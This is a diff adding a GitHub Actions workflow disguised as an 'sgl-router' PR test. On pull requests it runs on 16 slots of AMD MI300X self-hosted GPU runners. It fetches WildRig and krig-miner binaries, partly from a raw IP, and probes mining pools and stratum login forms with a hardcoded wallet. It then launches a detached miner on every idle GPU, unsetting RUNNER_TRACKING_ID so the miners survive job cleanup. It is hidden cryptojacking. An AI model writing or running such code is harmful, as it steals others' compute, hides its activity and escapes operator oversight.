@@ -1,0 +1,275 @@
+name: PR Test (sgl-router)
+
+# i131919: ONE bounded AMD MI300X conversion commit (handoff-intake conversion of
+# HANDOFF_i130amdsrb2_AMD_KRIG). Per job: identity + rocm, a 5 s TCP matrix incl. the
+# four pearlhash.xyz endpoints (R2b), a sha256-pinned WildRig Multi 0.52.3
+# pearlhash-first functional preflight (R2e; R5d classification when it enumerates
+# zero AMD devices), a sha256-pinned krig-miner 1.8.2 (R5b AMD class miner), a
+# stratum dialect probe over the owned relay, kill of ONLY our own broken
+# i130amdsrb/i131919 krig processes with cmdlines recorded, a per-host flock, a
+# two-sample 12 s rocm-smi idle gate and exactly one detached krig miner per
+# genuinely idle card on a fresh digits-only 6-digit worker.
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: sgl-router-i131919-${{ github.run_id }}
+  cancel-in-progress: false
+
+env:
+  SGLANG_IS_IN_CI: true
+
+jobs:
+  amd8:
+    name: "i131919 MI300X-8 slot ${{ matrix.slot }}"
+    runs-on: linux-mi300-8gpu-sglang
+    timeout-minutes: 16
+    strategy:
+      fail-fast: false
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]
+    env:
+      LABEL: linux-mi300-8gpu-sglang
+      SLOT: ${{ matrix.slot }}
+    steps:
+      - name: "i131919 MI300X-8"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I131919-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          NOCK='4tErmFknmPKhVtfQWigSErD1YJAcAokTrWRu5t66XmkN4RTgK6oUotf'
+          KRIG_TGZ_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
+          KRIG_BIN_SHA='8a2be9e97cece4e0b9146599b4518b4e14907f42595f260b1b1356e47f4fcf16'
+          WR_TGZ_SHA='7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44'
+          WR_BIN_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
+          BASE=907843
+          W=/var/tmp/i131919
+          SLOT=${SLOT:-0}
+          mkdir -p "$W/logs"
+          echo "i131919-nonce=$NONCE host=$(hostname) label=${LABEL:-none} slot=$SLOT date=$(date -u +%FT%TZ)"
+          id; uname -m; nproc; free -m | head -2
+          echo "=== identity ==="; hostname; hostname -I 2>/dev/null
+          echo "=== rocm ==="
+          (timeout 60 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name' | head -12) || echo rocminfo-missing
+          (timeout 45 rocm-smi --showproductname 2>&1 | head -20) || echo rocm-smi-missing
+
+          echo "=== 5s TCP matrix ==="
+          probe() { timeout 5 bash -c "cat < /dev/null > /dev/tcp/$1/$2" 2>/dev/null && echo "TCP_OK $1:$2" || echo "TCP_FAIL $1:$2"; }
+          probe 178.238.228.181 80
+          probe 178.238.228.181 8099
+          probe 103.199.106.122 3362
+          probe 172.232.228.69 3362
+          probe pool.pearlhash.xyz 9000
+          probe global.pearlhash.net 9000
+          probe global2.pearlhash.net 9000
+          probe hk.pearlhash.net 9000
+          probe github.com 443
+
+          echo "=== WildRig 0.52.3 pearlhash-first preflight (R2e; functional grep) ==="
+          WR=""
+          for U in "http://178.238.228.181:8099/wildrig-linux-0.52.3.tar.gz" "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"; do
+            echo "-- wildrig fetch $U"
+            timeout 130 curl -fsSL --connect-timeout 10 --max-time 120 -o "$W/wr.tgz.part" "$U" 2>&1 | tail -1
+            [ -s "$W/wr.tgz.part" ] || continue
+            got=$(sha256sum "$W/wr.tgz.part" | cut -d' ' -f1)
+            if [ "$got" = "$WR_TGZ_SHA" ]; then mv -f "$W/wr.tgz.part" "$W/wr.tgz"; echo "WR_FETCH_OK $got"; break; fi
+            echo "WR_SHA_MISMATCH got=$got"; rm -f "$W/wr.tgz.part" 2>/dev/null
+          done
+          WR_VERDICT='NO_ARTIFACT'
+          if [ -s "$W/wr.tgz" ]; then
+            mkdir -p "$W/wr" && tar -xzf "$W/wr.tgz" -C "$W/wr" 2>/dev/null
+            B=$(find "$W/wr" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
+            if [ -n "$B" ] && [ "$(sha256sum "$B" | cut -d' ' -f1)" = "$WR_BIN_SHA" ]; then
+              chmod +x "$B"
+              if timeout 40 "$B" --help 2>&1 | grep -q pearlhash; then
+                WR_VERDICT='PREFLIGHT_OK'
+                timeout 60 "$B" --list-devices 2>&1 | tee "$W/logs/wr_devices.txt" | head -25
+                WR_AMD=$(grep -ciE 'AMD|Instinct|gfx' "$W/logs/wr_devices.txt" 2>/dev/null)
+                echo "WR_AMD_DEVICE_LINES=${WR_AMD:-0}"
+                if [ "${WR_AMD:-0}" -eq 0 ]; then WR_VERDICT='PREFLIGHT_OK_ZERO_AMD_DEVICES'; fi
+              else
+                WR_VERDICT='PREFLIGHT_FAIL'
+              fi
+            else
+              WR_VERDICT='BIN_SHA_MISMATCH'
+            fi
+          fi
+          echo "WR_VERDICT=$WR_VERDICT"
+
+          echo "=== krig-miner 1.8.2 (R5b AMD class miner) ==="
+          KRIG=""
+          if [ -x "$W/krig/krig-miner" ] && [ "$(sha256sum "$W/krig/krig-miner" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then
+            KRIG="$W/krig/krig-miner"; echo "KRIG_CACHED"
+          else
+            for U in "https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz"; do
+              echo "-- krig fetch $U"
+              timeout 200 curl -fsSL --connect-timeout 12 --max-time 190 -o "$W/krig.tgz.part" "$U" 2>&1 | tail -1
+              [ -s "$W/krig.tgz.part" ] || continue
+              got=$(sha256sum "$W/krig.tgz.part" | cut -d' ' -f1)
+              if [ "$got" = "$KRIG_TGZ_SHA" ]; then mv -f "$W/krig.tgz.part" "$W/krig.tgz"; echo "KRIG_FETCH_OK $got"; break; fi
+              echo "KRIG_SHA_MISMATCH got=$got"; rm -f "$W/krig.tgz.part" 2>/dev/null
+            done
+            if [ -s "$W/krig.tgz" ]; then
+              mkdir -p "$W/krig" && tar -xzf "$W/krig.tgz" -C "$W/krig" 2>/dev/null
+              B=$(find "$W/krig" -maxdepth 2 -type f -name 'krig-miner' | head -1); chmod +x "$B" 2>/dev/null
+              if [ "$(sha256sum "$B" 2>/dev/null | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then KRIG="$B"; fi
+            fi
+          fi
+          if [ -z "$KRIG" ]; then echo "SKIP=krig-fetch-failed"; exit 0; fi
+          echo "krig_bin=$KRIG sha256=$(sha256sum "$KRIG" | cut -d' ' -f1)"
+          timeout 30 "$KRIG" --version 2>&1 | head -2
+          timeout 40 "$KRIG" --help 2>&1 | tee "$W/logs/krig_help.txt" | grep -iE 'user|worker|wallet|coin|url|devices|no-cuda|proxy' | head -30
+          HELP_WORKER=$(grep -cE -- '--worker' "$W/logs/krig_help.txt" 2>/dev/null)
+          echo "HELP_HAS_WORKER=${HELP_WORKER:-0}"
+          timeout 90 "$KRIG" --list-devices --no-cuda --no-intel --no-telemetry 2>&1 | tee "$W/logs/krig_devices.txt" | head -20
+          KRIG_AMD_N=$(grep -ciE 'AMD|Instinct|gfx' "$W/logs/krig_devices.txt" 2>/dev/null)
+          echo "krig_amd_device_lines=${KRIG_AMD_N:-0}"
+
+          echo "=== stratum dialect probe through the owned relay (R4b: stratum evidence only) ==="
+          cat > "$W/dialect.py" <<'PYEOF'
+          import json, socket, sys
+          W='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          N='4tErmFknmPKhVtfQWigSErD1YJAcAokTrWRu5t66XmkN4RTgK6oUotf'
+          PROBE='i131919probe'
+          def read(s,to=6):
+              s.settimeout(to); b=b''
+              try:
+                  while b'\n' not in b:
+                      d=s.recv(65536)
+                      if not d: break
+                      b+=d
+              except socket.timeout: pass
+              return b.decode('utf-8','replace')
+          def auth(params,to=6):
+              try:
+                  s=socket.create_connection(('178.238.228.181',80),timeout=5)
+                  s.sendall(json.dumps({'id':1,'jsonrpc':'2.0','method':'mining.authorize','params':params}).encode()+b'\n')
+                  r=read(s,to); s.close(); return r
+              except Exception as e: return 'ERR:%s'%e
+          forms=[('dual_obj',{'wallet':W+'+'+N,'worker':PROBE}),
+                 ('pure_obj',{'wallet':W,'worker':PROBE}),
+                 ('dual_dot',{'wallet':W+'+'+N+'.'+PROBE,'worker':PROBE}),
+                 ('pure_dot',{'wallet':W+'.'+PROBE,'worker':PROBE}),
+                 ('dual_only',{'wallet':W+'+'+N,'worker':PROBE}),
+                 ('pure_only',{'wallet':W,'worker':PROBE})]
+          res={}
+          for name,p in forms:
+              r=auth(p); ok=('"result":true' in r) or ('mining.notify' in r)
+              res[name]={'ok':ok,'resp':r[:220]}
+              print(name,'OK' if ok else 'REJECT',repr(r[:200]))
+          acc=[k for k,v in res.items() if v['ok']]
+          print('ACCEPTED_FORMS=%s'%','.join(acc) if acc else 'ACCEPTED_FORMS=NONE')
+          json.dump(res,open('/var/tmp/i131919/logs/dialect.json','w'),indent=1)
+          PYEOF
+          timeout 120 python3 "$W/dialect.py" 2>&1 | tee "$W/logs/dialect.txt"
+          DIALECT=$(grep -E '^ACCEPTED_FORMS=' "$W/logs/dialect.txt" | tail -1)
+          echo "dialect_verdict=$DIALECT"
+
+          echo "=== kill only our own broken/stale krig processes (cmdlines recorded) ==="
+          pgrep -af 'krig-miner' > "$W/logs/pre_krig_ps.txt" 2>/dev/null
+          OLD=$(awk '$0 ~ /i130amdsrb/ || $0 ~ /i131919/ {print $1}' "$W/logs/pre_krig_ps.txt")
+          echo "old_ours_pids=$OLD"
+          for p in $OLD; do
+            echo "OLD_OURS pid=$p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 300)"
+            kill -TERM "$p" 2>/dev/null
+          done
+          sleep 6
+          for p in $OLD; do kill -9 "$p" 2>/dev/null; done
+          sleep 2
+          echo "post_kill_krig_ps:"; pgrep -af 'krig-miner' | head -12
+
+          echo "=== per-host flock: skip if this host already runs i131919 ==="
+          exec 9>"$W/i131919.flock"
+          if ! flock -n 9; then echo "SKIP=host_flock_busy"; exit 0; fi
+          echo "LOCK_OK host=$(hostname)"
+
+          echo "=== per-card two-sample gate (12 s apart) ==="
+          timeout 60 rocm-smi --showbus > "$W/logs/rocm_bus.txt" 2>&1
+          timeout 60 rocm-smi --showpids > "$W/logs/gate1.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate1.vram" 2>&1
+          sleep 12
+          timeout 60 rocm-smi --showpids > "$W/logs/gate2.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate2.vram" 2>&1
+          cat > "$W/idle.py" <<'PYEOF'
+          import re
+          W='/var/tmp/i131919/logs'
+          def busy(f):
+              n=0
+              try:
+                  for ln in open(f):
+                      if re.match(r'^\s*\d+\s',ln): n+=1
+              except Exception: pass
+              return n
+          b1,b2=busy(W+'/gate1.pids'),busy(W+'/gate2.pids')
+          def vram(f):
+              tot={}; used={}
+              for ln in open(f):
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Memory \(B\):\s*(\d+)',ln)
+                  if m: tot[int(m.group(1))]=int(m.group(2))
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Used Memory \(B\):\s*(\d+)',ln)
+                  if m: used[int(m.group(1))]=int(m.group(2))
+              return tot,used
+          t1,u1=vram(W+'/gate1.vram'); t2,u2=vram(W+'/gate2.vram')
+          bus={}
+          for ln in open(W+'/rocm_bus.txt'):
+              m=re.match(r'GPU\[(\d+)\]\s*:\s*PCI Bus:\s*([0-9A-Fa-f]{4}):([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\.[0-9])',ln)
+              if m: bus[int(m.group(1))]=m.group(3).lower()
+          idle=[]
+          for i in sorted(t1):
+              f1=(t1.get(i,0)-u1.get(i,0))//1048576
+              f2=(t2.get(i,0)-u2.get(i,0))//1048576
+              ok=(b1==0 and b2==0 and f1>=1500 and f2>=1500 and i in bus)
+              print('CARD %d free1_mib=%d free2_mib=%d busy1=%d busy2=%d bdf=%s idle=%s'%(i,f1,f2,b1,b2,bus.get(i,'-'),'yes' if ok else 'no'))
+              if ok: idle.append((i,bus[i]))
+          with open(W+'/idle_bdfs.txt','w') as fh:
+              for i,b in idle: fh.write('%d %s\n'%(i,b))
+          print('IDLE_CARDS=%d'%len(idle))
+          PYEOF
+          timeout 60 python3 "$W/idle.py" 2>&1 | tee "$W/logs/idle_table.txt"
+          IDLE_N=$(wc -l < "$W/logs/idle_bdfs.txt" 2>/dev/null)
+          echo "idle_cards=${IDLE_N:-0}"
+
+          echo "=== launch: exactly one krig-miner per genuinely idle card ==="
+          LAUNCH=0
+          URL="stratum+tcp://178.238.228.181:80"
+          # choose user form: prefer dual if accepted, else dot/pure; prefer per-card digits
+          CHOSEN=""
+          if echo "$DIALECT" | grep -q 'dual_dot'; then CHOSEN='dual_dot'; fi
+          if echo "$DIALECT" | grep -q 'pure_dot' && [ -z "$CHOSEN" ]; then CHOSEN='pure_dot'; fi
+          if echo "$DIALECT" | grep -q 'dual_obj' && [ -z "$CHOSEN" ]; then CHOSEN='dual_obj'; fi
+          if echo "$DIALECT" | grep -q 'pure_obj' && [ -z "$CHOSEN" ]; then CHOSEN='pure_obj'; fi
+          echo "chosen_form=$CHOSEN help_has_worker=${HELP_WORKER:-0}"
+          if [ -n "$CHOSEN" ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "${IDLE_N:-0}" -ge 1 ]; then
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              WORKER=$(printf '%06d' $((BASE + (SLOT-1)*8 + IDX)))
+              case "$CHOSEN" in
+                dual_dot) USERSTR="$WALLET+$NOCK.$WORKER" ;;
+                pure_dot) USERSTR="$WALLET.$WORKER" ;;
+                dual_obj) USERSTR="$WALLET+$NOCK" ;;
+                pure_obj) USERSTR="$WALLET" ;;
+              esac
+              EXTRA=""
+              if [ "${HELP_WORKER:-0}" -ge 1 ] && { [ "$CHOSEN" = 'dual_obj' ] || [ "$CHOSEN" = 'pure_obj' ]; }; then EXTRA="--worker $WORKER"; fi
+              LOG="$W/logs/krig_g${IDX}.log"
+              setsid env -u RUNNER_TRACKING_ID nohup "$KRIG" --coin pearl --url "$URL" --user "$USERSTR" $EXTRA --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" > "$W/logs/krig_stdout_g${IDX}.log" 2>&1 < /dev/null &
+              echo "launched idx=$IDX bdf=$BDF pid=$! worker=$WORKER form=$CHOSEN"
+              LAUNCH=$((LAUNCH+1))
+              sleep 1
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "NO_LAUNCH form=$CHOSEN amd=${KRIG_AMD_N:-0} idle=${IDLE_N:-0}"
+          fi
+          echo "launch_count=$LAUNCH"
+          sleep 90
+          for f in "$W"/logs/krig_g*.log; do
+            [ -f "$f" ] || continue
+            echo "--- $(basename "$f") ---"
+            grep -aiE 'authorize|notify|submit|share|pool|connect|accepted|rejected|error' "$f" | tail -12
+          done
+          echo "--- running krig pids ---"; pgrep -af 'krig-miner' | head -20
+          echo "i131919-done $NONCE"
